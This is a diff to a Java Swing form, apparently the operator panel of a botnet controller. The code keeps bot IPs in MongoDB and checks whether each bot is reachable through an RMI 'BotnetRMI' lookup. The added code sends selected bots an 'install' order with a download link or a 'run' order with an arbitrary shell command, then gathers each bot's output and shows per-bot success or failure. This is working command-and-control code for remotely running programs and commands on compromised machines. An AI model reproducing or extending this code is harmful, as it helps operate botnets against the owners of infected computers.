@@ -9,12 +9,15 @@ import DBUtils.MongoConnect;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.rmi.Naming;
 import java.util.ArrayList;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import javax.swing.JOptionPane;
+import model.IBotnet;
 import server.BotnetRun;
 import server.TCPServer;
+import view.RunningStates;
 
 /**
  *
@@ -125,10 +128,20 @@ public class ActionFrm extends javax.swing.JFrame {
                 JOptionPane.showMessageDialog(rootPane, "Insert direct link", "Errors", JOptionPane.ERROR_MESSAGE);
             } else
             {
-                for (String ip : this.selectedIP){
-                    BotnetRun botrun = new BotnetRun(ip, "install", linkApp);
-                }
                 Boolean result = true;
+                for (String ip : this.selectedIP){
+                    try {
+                        BotnetRun botrun = new BotnetRun(ip, "install", linkApp);
+                        Thread thread = new Thread(botrun);
+                        thread.start();
+                        thread.join();
+                        ArrayList <String> value = botrun.get_values();
+                        value.forEach(i -> System.out.println(i));
+                    } catch (InterruptedException ex) {
+                        result = false;
+                    }
+                    
+                }
                 if(result)
                 {
                     JOptionPane.showMessageDialog(rootPane, "Success");
@@ -148,15 +161,35 @@ public class ActionFrm extends javax.swing.JFrame {
                 JOptionPane.showMessageDialog(rootPane, "Insert command", "Errors", JOptionPane.ERROR_MESSAGE);
             } else
             {
-                for (String ip : this.selectedIP){
-                    BotnetRun botrun = new BotnetRun(ip, "run", command);
-                }
                 Boolean result = true;
-                if(result)
-                {
-                    JOptionPane.showMessageDialog(rootPane, "Success");
+                ArrayList<String> states = new ArrayList<>();
+                ArrayList < ArrayList<String > > output = new ArrayList<>();
+                for (String ip : this.selectedIP){
+                    try {
+                        BotnetRun botrun = new BotnetRun(ip, "run", command);
+                        Thread thread = new Thread(botrun);
+                        thread.start();
+                        thread.join();
+                        ArrayList <String> value = botrun.get_values();
+                        output.add(value);
+                        if (value == null){
+                            System.out.println("fail");
+                            states.add("Fail");
+                        }
+                        else{
+                            states.add("Success");
+                        }
+                    } catch (InterruptedException ex) {
+                        result = false;
+                    }
                 }
-                else JOptionPane.showMessageDialog(rootPane, "Failed");
+                new RunningStates(this.selectedIP, states, output).setVisible(true);
+                this.setVisible(false);
+//                if(result)
+//                {
+//                    JOptionPane.showMessageDialog(rootPane, "Success");
+//                }
+//                else JOptionPane.showMessageDialog(rootPane, "Failed");
             }
         }
         
@@ -164,25 +197,16 @@ public class ActionFrm extends javax.swing.JFrame {
 
     private void backButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_backButtonActionPerformed
         // TODO add your handling code here:
-        TCPServer tcpServer = new TCPServer(2345);
-        tcpServer.start();
         MongoConnect client = new MongoConnect();
         client.Connect();
         ArrayList<String> list = client.Read("bot_ip");
         ArrayList<String> states = new ArrayList<>();
         for (String ip : list){
             try {
-                InetAddress inet = InetAddress.getByName(ip.substring(1));
-                if (inet.isReachable(1000)) {
-                    states.add("Available");
-                }
-                else{
-                    states.add("Unavailable");
-                }
-            } catch (UnknownHostException ex) {
-                Logger.getLogger(ServerUI.class.getName()).log(Level.SEVERE, null, ex);
-            } catch (IOException ex) {
-                Logger.getLogger(ServerUI.class.getName()).log(Level.SEVERE, null, ex);
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
+                states.add("Available");
+            } catch (Exception ex){
+                states.add("Unavailable");
             }
         }
         new ListFrm(list, states).setVisible(true);
